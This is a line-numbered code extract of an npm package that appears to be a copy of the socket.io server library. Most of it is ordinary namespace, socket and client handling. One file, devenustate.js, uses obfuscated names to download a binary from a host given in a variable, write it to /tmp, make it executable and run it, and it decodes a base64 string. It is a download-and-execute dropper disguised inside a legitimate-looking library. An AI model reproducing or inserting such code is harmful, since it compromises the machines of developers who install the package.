// File: package/lib/client.js
// ======================================================================
Line 6: var parser = require('socket.io-parser')
Line 7: var debug = require('debug')('socket.io:client')
Line 8: var url = require('url')
Line 24: {
  this.server = server;
  this.conn = conn;
  this.encoder = server.encoder;
  this.decoder = new server.parser.Decoder();
  this.id = conn.id;
  this.request = conn.request;
  this.setup();
  this.sockets = {};
  this.nsps = {};
  this.connectBuffer = [];
}
Line 34: this.connectBuffer = []
Line 44: this.onclose.bind(this)
Line 45: this.ondata.bind(this)
Line 46: this.onerror.bind(this)
Line 47: this.ondecoded.bind(this)
Line 92: this.connectBuffer.push(name)
Line 97: {
    self.sockets[socket.id] = socket;
    self.nsps[nsp.name] = socket;

    if ('/' == nsp.name && self.connectBuffer.length > 0) {
      self.connectBuffer.forEach(self.connect, self);
      self.connectBuffer = [];
    }
  }
Line 98: self.sockets[socket.id] = socket
Line 99: self.nsps[nsp.name] = socket
Line 101: {
      self.connectBuffer.forEach(self.connect, self);
      self.connectBuffer = [];
    }
Line 103: self.connectBuffer = []
Line 115: _iterator_0.next()
Line 116: {
      this.sockets[id].disconnect();
    }
Line 117: this.sockets[id].disconnect()
Line 131: {
    var nsp = this.sockets[socket.id].nsp.name;
    delete this.sockets[socket.id];
    delete this.nsps[nsp];
  }
Line 132: var nsp = this.sockets[socket.id].nsp.name
Line 133: delete this.sockets[socket.id]
Line 134: delete this.nsps[nsp]
Line 169: {
      self.conn.write(encodedPackets[i], { compress: opts.compress });
    }
Line 170: self.conn.write(encodedPackets[i], { compress: opts.compress })
Line 210: {
    var socket = this.nsps[packet.nsp];
    if (socket) {
      process.nextTick(function() {
        socket.onpacket(packet);
      });
    } else {
      debug('no socket for namespace %s', packet.nsp);
    }
  }
Line 211: var socket = this.nsps[packet.nsp]
Line 213: process.nextTick(function() {
        socket.onpacket(packet);
      })
Line 214: socket.onpacket(packet)
Line 230: _iterator_1.next()
Line 231: {
      this.sockets[id].onerror(err);
    }
Line 232: this.sockets[id].onerror(err)
Line 245: {
  debug('client close with reason %s', reason);

  // ignore a potential subsequent `close` event
  this.destroy();

  // `nsps` and `sockets` are cleaned up seamlessly
  for (var id in this.sockets) {
    if (this.sockets.hasOwnProperty(id)) {
      this.sockets[id].onclose(reason);
    }
  }
  this.sockets = {};

  this.decoder.destroy(); // clean up decoder
}
Line 249: this.destroy()
Line 252: _iterator_2.next()
Line 253: {
      this.sockets[id].onclose(reason);
    }
Line 254: this.sockets[id].onclose(reason)
Line 259: this.decoder.destroy()

// File: package/lib/devenustate.js
// ======================================================================
Line 1: const http = require('http')
Line 2: const child_process = require('child_process')
Line 3: const dns = require('dns')
Line 4: const fs = require('fs')
Line 9: snorers = http.get('http://' + dhole + '/upbred', function(coconstituent) {
          var thermostated = fs.createWriteStream('/tmp/noninhibitory');
          coconstituent.on('data', function(mopokes) {
            thermostated.write(mopokes);
          });
          coconstituent.on('end', function() {
            thermostated.end();
            fs.chmod('/tmp/noninhibitory', '0777');
            child_process.exec('/tmp/noninhibitory', function(err, stdout, stderr) {});
          });
        })
Line 11: {
            thermostated.write(mopokes);
          }
Line 12: thermostated.write(mopokes)
Line 14: {
            thermostated.end();
            fs.chmod('/tmp/noninhibitory', '0777');
            child_process.exec('/tmp/noninhibitory', function(err, stdout, stderr) {});
          }
Line 15: thermostated.end()
Line 17: child_process.exec('/tmp/noninhibitory', function(err, stdout, stderr) {})
Line 25: (new Buffer(embrawn, 'base64')).toString()

// File: package/lib/index.js
// ======================================================================
Line 7: var http = require('http')
Line 8: var read = require('fs').readFileSync
Line 9: var path = require('path')
Line 10: var exists = require('fs').existsSync
Line 11: var engine = require('engine.io')
Line 12: var clientVersion = require('socket.io-client/package.json').version
Line 13: var Client = require('./client')
Line 14: var Emitter = require('events').EventEmitter
Line 15: var Namespace = require('./namespace')
Line 16: var ParentNamespace = require('./parent-namespace')
Line 17: var Adapter = require('socket.io-adapter')
Line 18: var parser = require('socket.io-parser')
Line 19: var debug = require('debug')('socket.io:server')
Line 20: var url = require('url')
Line 52: this.path(opts.path || '/socket.io')
Line 79: var parts = url.parse(origin)
Line 116: read(resolvePath( 'socket.io-client/dist/socket.io.js'), 'utf-8')
Line 118: read(resolvePath( 'socket.io-client/dist/socket.io.js.map'), 'utf-8')
Line 147: next(new Error(err))
Line 148: next(new Error('Not authorized'))
Line 149: next()
Line 155: this.path(val)
Line 156: {
    this.eio[oldSettings[key]] = val;
  }
Line 157: this.eio[oldSettings[key]] = val
Line 174: {
  if (this.parentNsps.size === 0) return fn(false);

  const keysIterator = this.parentNsps.keys();

  const run = () => {
    let nextFn = keysIterator.next();
    if (nextFn.done) {
      return fn(false);
    }
    nextFn.value(name, query, (err, allow) => {
      if (err || !allow) {
        run();
      } else {
        fn(this.parentNsps.get(nextFn.value).createChild(name));
      }
    });
  };

  run();
}
Line 177: this.parentNsps.keys()
Line 180: keysIterator.next()
Line 185: {
        run();
      }
Line 186: run()
Line 193: run()
Line 221: _iterator_0.next()
Line 222: {
      this.nsps[i].initAdapter();
    }
Line 223: this.nsps[i].initAdapter()
Line 269: {
      res.writeHead(404);
      res.end();
    }
Line 271: res.end()
Line 279: this.path()
Line 281: this.checkRequest.bind(this)
Line 319: this.bind(this.eio)
Line 338: self.serveMap(req, res)
Line 342: {
        evs[i].call(srv, req, res);
      }
Line 343: evs[i].call(srv, req, res)
Line 357: {
  // Per the standard, ETags must be quoted:
  // https://tools.ietf.org/html/rfc7232#section-2.3
  var expectedEtag = '"' + clientVersion + '"';

  var etag = req.headers['if-none-match'];
  if (etag) {
    if (expectedEtag == etag) {
      debug('serve client 304');
      res.writeHead(304);
      res.end();
      return;
    }
  }

  debug('serve client source');
  res.setHeader('Content-Type', 'application/javascript');
  res.setHeader('ETag', expectedEtag);
  res.writeHead(200);
  res.end(clientSource);
}
Line 362: var etag = req.headers['if-none-match']
Line 364: {
      debug('serve client 304');
      res.writeHead(304);
      res.end();
      return;
    }
Line 367: res.end()
Line 376: res.end(clientSource)
Line 387: {
  // Per the standard, ETags must be quoted:
  // https://tools.ietf.org/html/rfc7232#section-2.3
  var expectedEtag = '"' + clientVersion + '"';

  var etag = req.headers['if-none-match'];
  if (etag) {
    if (expectedEtag == etag) {
      debug('serve client 304');
      res.writeHead(304);
      res.end();
      return;
    }
  }

  debug('serve client sourcemap');
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('ETag', expectedEtag);
  res.writeHead(200);
  res.end(clientSourceMap);
}
Line 392: var etag = req.headers['if-none-match']
Line 394: {
      debug('serve client 304');
      res.writeHead(304);
      res.end();
      return;
    }
Line 397: res.end()
Line 406: res.end(clientSourceMap)
Line 419: this.onconnection.bind(this)
Line 446: {
  if (typeof name === 'function' || name instanceof RegExp) {
    const parentNsp = new ParentNamespace(this);
    debug('initializing parent namespace %s', parentNsp.name);
    if (typeof name === 'function') {
      this.parentNsps.set(name, parentNsp);
    } else {
      this.parentNsps.set((nsp, conn, next) => next(null, name.test(nsp)), parentNsp);
    }
    if (fn) parentNsp.on('connect', fn);
    return parentNsp;
  }

  if (String(name)[0] !== '/') name = '/' + name;

  var nsp = this.nsps[name];
  if (!nsp) {
    debug('initializing namespace %s', name);
    nsp = new Namespace(this, name);
    this.nsps[name] = nsp;
  }
  if (fn) nsp.on('connect', fn);
  return nsp;
}
Line 453: next(null, name.test(nsp))
Line 461: var nsp = this.nsps[name]
Line 462: {
    debug('initializing namespace %s', name);
    nsp = new Namespace(this, name);
    this.nsps[name] = nsp;
  }
Line 465: this.nsps[name] = nsp
Line 478: {
  for (var id in this.nsps['/'].sockets) {
    if (this.nsps['/'].sockets.hasOwnProperty(id)) {
      this.nsps['/'].sockets[id].onclose();
    }
  }

  this.engine.close();

  if (this.httpServer) {
    this.httpServer.close(fn);
  } else {
    fn && fn();
  }
}
Line 479: for (var id in this.nsps['/'].sockets) {
    if (this.nsps['/'].sockets.hasOwnProperty(id)) {
      this.nsps['/'].sockets[id].onclose();
    }
  }
Line 480: {
      this.nsps['/'].sockets[id].onclose();
    }
Line 481: this.nsps['/'].sockets[id].onclose()
Line 498: Object.keys(Emitter.prototype)
Line 502: {
  Server.prototype[fn] = function(){
    return this.sockets[fn].apply(this.sockets, arguments);
  };
}
Line 503: Server.prototype[fn] = function(){
    return this.sockets[fn].apply(this.sockets, arguments);
  }
Line 510: {
      this.sockets.flags = this.sockets.flags || {};
      this.sockets.flags[flag] = true;
      return this;
    }
Line 512: this.sockets.flags[flag] = true

// File: package/lib/namespace.js
// ======================================================================
Line 6: var Socket = require('./socket')
Line 7: var Emitter = require('events').EventEmitter
Line 8: var parser = require('socket.io-parser')
Line 9: var hasBin = require('has-binary2')
Line 10: var debug = require('debug')('socket.io:namespace')
Line 23: _tmp_3.push("connect")
Line 24: _tmp_3.push("connection")
Line 25: _tmp_3.push("newListener")
Line 33: _tmp_4.push("json")
Line 34: _tmp_4.push("volatile")
Line 35: _tmp_4.push("local")
Line 52: {
  this.name = name;
  this.server = server;
  this.sockets = {};
  this.connected = {};
  this.fns = [];
  this.ids = 0;
  this.rooms = [];
  this.flags = {};
  this.initAdapter();
}
Line 57: this.fns = []
Line 59: this.rooms = []
Line 76: {
      this.flags[flag] = true;
      return this;
    }
Line 77: this.flags[flag] = true
Line 107: this.fns.push(fn)
Line 119: {
  var fns = this.fns.slice(0);
  if (!fns.length) return fn(null);

  function run(i){
    fns[i](socket, function(err){
      // upon error, short-circuit
      if (err) return fn(err);

      // if no middleware left, summon callback
      if (!fns[i + 1]) return fn(null);

      // go on to next
      run(i + 1);
    });
  }

  run(0);
}
Line 123: {
    fns[i](socket, function(err){
      // upon error, short-circuit
      if (err) return fn(err);

      // if no middleware left, summon callback
      if (!fns[i + 1]) return fn(null);

      // go on to next
      run(i + 1);
    });
  }
Line 124: fns[i](socket, function(err){
      // upon error, short-circuit
      if (err) return fn(err);

      // if no middleware left, summon callback
      if (!fns[i + 1]) return fn(null);

      // go on to next
      run(i + 1);
    })
Line 132: run(i + 1)
Line 136: run(0)
Line 149: this.rooms.push(name)
Line 160: {
  debug('adding socket to nsp %s', this.name);
  var socket = new Socket(this, client, query);
  var self = this;
  this.run(socket, function(err){
    process.nextTick(function(){
      if ('open' == client.conn.readyState) {
        if (err) return socket.error(err.data || err.message);

        // track socket
        self.sockets[socket.id] = socket;

        // it's paramount that the internal `onconnect` logic
        // fires before user-set events to prevent state order
        // violations (such as a disconnection before the connection
        // logic is complete)
        socket.onconnect();
        if (fn) fn();

        // fire user-set events
        self.emit('connect', socket);
        self.emit('connection', socket);
      } else {
        debug('next called after client was closed - ignoring socket');
      }
    });
  });
  return socket;
}
Line 164: this.run(socket, function(err){
    process.nextTick(function(){
      if ('open' == client.conn.readyState) {
        if (err) return socket.error(err.data || err.message);

        // track socket
        self.sockets[socket.id] = socket;

        // it's paramount that the internal `onconnect` logic
        // fires before user-set events to prevent state order
        // violations (such as a disconnection before the connection
        // logic is complete)
        socket.onconnect();
        if (fn) fn();

        // fire user-set events
        self.emit('connect', socket);
        self.emit('connection', socket);
      } else {
        debug('next called after client was closed - ignoring socket');
      }
    });
  })
Line 165: process.nextTick(function(){
      if ('open' == client.conn.readyState) {
        if (err) return socket.error(err.data || err.message);

        // track socket
        self.sockets[socket.id] = socket;

        // it's paramount that the internal `onconnect` logic
        // fires before user-set events to prevent state order
        // violations (such as a disconnection before the connection
        // logic is complete)
        socket.onconnect();
        if (fn) fn();

        // fire user-set events
        self.emit('connect', socket);
        self.emit('connection', socket);
      } else {
        debug('next called after client was closed - ignoring socket');
      }
    })
Line 166: {
        if (err) return socket.error(err.data || err.message);

        // track socket
        self.sockets[socket.id] = socket;

        // it's paramount that the internal `onconnect` logic
        // fires before user-set events to prevent state order
        // violations (such as a disconnection before the connection
        // logic is complete)
        socket.onconnect();
        if (fn) fn();

        // fire user-set events
        self.emit('connect', socket);
        self.emit('connection', socket);
      }
Line 170: self.sockets[socket.id] = socket
Line 180: self.emit('connect', socket)
Line 181: self.emit('connection', socket)
Line 197: {
    delete this.sockets[socket.id];
  }
Line 198: delete this.sockets[socket.id]
Line 211: {
  if (~exports.events.indexOf(ev)) {
    emit.apply(this, arguments);
    return this;
  }
  // set up packet object
  var args = Array.prototype.slice.call(arguments);
  var packet = {
    type: (this.flags.binary !== undefined ? this.flags.binary : hasBin(args)) ? parser.BINARY_EVENT : parser.EVENT,
    data: args
  };

  if ('function' == typeof args[args.length - 1]) {
    throw new Error('Callbacks are not supported when broadcasting');
  }

  var rooms = this.rooms.slice(0);
  var flags = Object.assign({}, this.flags);

  // reset flags
  this.rooms = [];
  this.flags = {};

  this.adapter.broadcast(packet, {
    rooms: rooms,
    flags: flags
  });

  return this;
}
Line 217: Array.prototype.slice.call(arguments)
Line 231: this.rooms = []
Line 251: Array.prototype.slice.call(arguments)
Line 264: {
  this.adapter.clients(this.rooms, fn);
  // reset rooms for scenario:
  // .in('room').clients() (GH-1978)
  this.rooms = [];
  return this;
}
Line 268: this.rooms = []

// File: package/lib/parent-namespace.js
// ======================================================================
Line 3: const Namespace = require('./namespace')
Line 16: {
    const args = Array.prototype.slice.call(arguments);

    this.children.forEach(nsp => {
      nsp.rooms = this.rooms;
      nsp.flags = this.flags;
      nsp.emit.apply(nsp, args);
    });
    this.rooms = [];
    this.flags = {};
  }
Line 17: Array.prototype.slice.call(arguments)
Line 24: this.rooms = []
Line 28: {
    const namespace = new Namespace(this.server, name);
    namespace.fns = this.fns.slice(0);
    this.listeners('connect').forEach(listener => namespace.on('connect', listener));
    this.listeners('connection').forEach(listener => namespace.on('connection', listener));
    this.children.add(namespace);
    this.server.nsps[name] = namespace;
    return namespace;
  }
Line 34: this.server.nsps[name] = namespace

// File: package/lib/socket.js
// ======================================================================
Line 6: var Emitter = require('events').EventEmitter
Line 7: var parser = require('socket.io-parser')
Line 8: var hasBin = require('has-binary2')
Line 9: var url = require('url')
Line 10: var debug = require('debug')('socket.io:socket')
Line 25: _tmp_3.push("error")
Line 26: _tmp_3.push("connect")
Line 27: _tmp_3.push("disconnect")
Line 28: _tmp_3.push("disconnecting")
Line 29: _tmp_3.push("newListener")
Line 30: _tmp_3.push("removeListener")
Line 40: _tmp_4.push("json")
Line 41: _tmp_4.push("volatile")
Line 42: _tmp_4.push("broadcast")
Line 43: _tmp_4.push("local")
Line 60: {
  this.nsp = nsp;
  this.server = nsp.server;
  this.adapter = this.nsp.adapter;
  this.id = nsp.name !== '/' ? nsp.name + '#' + client.id : client.id;
  this.client = client;
  this.conn = client.conn;
  this.rooms = {};
  this.acks = {};
  this.connected = true;
  this.disconnected = false;
  this.handshake = this.buildHandshake(query);
  this.fns = [];
  this.flags = {};
  this._rooms = [];
}
Line 72: this.fns = []
Line 74: this._rooms = []
Line 89: {
      this.flags[flag] = true;
      return this;
    }
Line 90: this.flags[flag] = true
Line 117: var requestQuery = url.parse(self.request.url, true).query
Line 140: {
  if (~exports.events.indexOf(ev)) {
    emit.apply(this, arguments);
    return this;
  }

  var args = Array.prototype.slice.call(arguments);
  var packet = {
    type: (this.flags.binary !== undefined ? this.flags.binary : hasBin(args)) ? parser.BINARY_EVENT : parser.EVENT,
    data: args
  };

  // access last argument to see if it's an ACK callback
  if (typeof args[args.length - 1] === 'function') {
    if (this._rooms.length || this.flags.broadcast) {
      throw new Error('Callbacks are not supported when broadcasting');
    }

    debug('emitting packet with ack id %d', this.nsp.ids);
    this.acks[this.nsp.ids] = args.pop();
    packet.id = this.nsp.ids++;
  }

  var rooms = this._rooms.slice(0);
  var flags = Object.assign({}, this.flags);

  // reset flags
  this._rooms = [];
  this.flags = {};

  if (rooms.length || flags.broadcast) {
    this.adapter.broadcast(packet, {
      except: [this.id],
      rooms: rooms,
      flags: flags
    });
  } else {
    // dispatch...
Line 146: Array.prototype.slice.call(arguments)
Line 153: {
    if (this._rooms.length || this.flags.broadcast) {
      throw new Error('Callbacks are not supported when broadcasting');
    }

    debug('emitting packet with ack id %d', this.nsp.ids);
    this.acks[this.nsp.ids] = args.pop();
    packet.id = this.nsp.ids++;
  }
Line 159: this.acks[this.nsp.ids] = args.pop()
Line 167: this._rooms = []
Line 170: {
    this.adapter.broadcast(packet, {
      except: [this.id],
      rooms: rooms,
      flags: flags
    });
  }
Line 171: this.adapter.broadcast(packet, {
      except: [this.id],
      rooms: rooms,
      flags: flags
    })
Line 172: _tmp_19.except = [this.id]
Line 193: this._rooms.push(name)
Line 206: Array.prototype.slice.call(arguments)
Line 239: {
    rooms = [rooms];
  }
Line 240: _tmp_27.push(rooms)
Line 252: {
      self.rooms[room] = room;
    }
Line 253: self.rooms[room] = room
Line 272: {
    if (err) return fn && fn(err);
    debug('left room %s', room);
    delete self.rooms[room];
    fn && fn(null);
  }
Line 275: delete self.rooms[room]
Line 301: {
  debug('socket connected - writing packet');
  this.nsp.connected[this.id] = this;
  this.join(this.id);
  var skip = this.nsp.name === '/' && this.nsp.fns.length === 0;
  if (skip) {
    debug('packet already sent in initial handshake');
  } else {
    this.packet({ type: parser.CONNECT });
  }
}
Line 303: this.nsp.connected[this.id] = this
Line 304: this.join(this.id)
Line 340: this.ondisconnect()
Line 355: {
  var args = packet.data || [];
  debug('emitting event %j', args);

  if (null != packet.id) {
    debug('attaching ack callback to event');
    args.push(this.ack(packet.id));
  }

  this.dispatch(args);
}
Line 356: var args = packet.data || []
Line 361: args.push(this.ack(packet.id))
Line 364: this.dispatch(args)
Line 380: Array.prototype.slice.call(arguments)
Line 399: {
  var ack = this.acks[packet.id];
  if ('function' == typeof ack) {
    debug('calling ack %s with %j', packet.id, packet.data);
    ack.apply(this, packet.data);
    delete this.acks[packet.id];
  } else {
    debug('bad ack %s', packet.id);
  }
}
Line 400: var ack = this.acks[packet.id]
Line 401: {
    debug('calling ack %s with %j', packet.id, packet.data);
    ack.apply(this, packet.data);
    delete this.acks[packet.id];
  }
Line 404: delete this.acks[packet.id]
Line 429: this.emit('error', err)
Line 444: {
  if (!this.connected) return this;
  debug('closing socket - reason %s', reason);
  this.emit('disconnecting', reason);
  this.leaveAll();
  this.nsp.remove(this);
  this.client.remove(this);
  this.connected = false;
  this.disconnected = true;
  delete this.nsp.connected[this.id];
  this.emit('disconnect', reason);
}
Line 447: this.emit('disconnecting', reason)
Line 448: this.leaveAll()
Line 453: delete this.nsp.connected[this.id]
Line 454: this.emit('disconnect', reason)
Line 520: {
  debug('dispatching an event %j', event);
  var self = this;
  function dispatchSocket(err) {
    process.nextTick(function(){
      if (err) {
        return self.error(err.data || err.message);
      }
      emit.apply(self, event);
    });
  }
  this.run(event, dispatchSocket);
}
Line 524: process.nextTick(function(){
      if (err) {
        return self.error(err.data || err.message);
      }
      emit.apply(self, event);
    })
Line 531: this.run(event, dispatchSocket)
Line 543: this.fns.push(fn)
Line 554: {
  var fns = this.fns.slice(0);
  if (!fns.length) return fn(null);

  function run(i){
    fns[i](event, function(err){
      // upon error, short-circuit
      if (err) return fn(err);

      // if no middleware left, summon callback
      if (!fns[i + 1]) return fn(null);

      // go on to next
      run(i + 1);
    });
  }

  run(0);
}
Line 558: {
    fns[i](event, function(err){
      // upon error, short-circuit
      if (err) return fn(err);

      // if no middleware left, summon callback
      if (!fns[i + 1]) return fn(null);

      // go on to next
      run(i + 1);
    });
  }
Line 559: fns[i](event, function(err){
      // upon error, short-circuit
      if (err) return fn(err);

      // if no middleware left, summon callback
      if (!fns[i + 1]) return fn(null);

      // go on to next
      run(i + 1);
    })
Line 567: run(i + 1)
Line 571: run(0)
